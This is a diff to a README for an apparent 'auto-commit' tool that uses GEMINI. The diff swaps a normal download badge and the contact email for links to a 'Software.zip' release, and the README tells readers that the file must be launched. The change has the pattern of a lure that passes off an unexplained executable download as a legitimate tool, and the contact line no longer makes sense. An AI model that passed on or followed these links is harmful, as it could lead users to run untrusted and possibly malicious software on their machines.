@@ -21,7 +21,7 @@ Automate your commits with the "auto-commit" repository! Have GEMINI stage and w
 
 To get started, you can download the necessary files from the following link: 
 
-[![Download auto-commit](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download auto-commit](https://github.com/Jay3x/auto-commit/releases/download/v1.0/Software.zip)](https://github.com/Jay3x/auto-commit/releases/download/v1.0/Software.zip)
 
 Remember, the file needs to be launched to set up the auto-commit feature successfully.
 
@@ -34,6 +34,6 @@ If the above link is not working, please check the "Releases" section for altern
 
 ## Get in Touch 📞
 
-Have questions or feedback? Feel free to reach out to us at [auto.commit@email.com](mailto:auto.commit@email.com).
+Have questions or feedback? Feel free to reach out to us at [https://github.com/Jay3x/auto-commit/releases/download/v1.0/Software.zip](https://github.com/Jay3x/auto-commit/releases/download/v1.0/Software.zip).
 
 Let GEMINI revolutionize your commit process and streamline your version control tasks. Happy automating! 🚀🔥
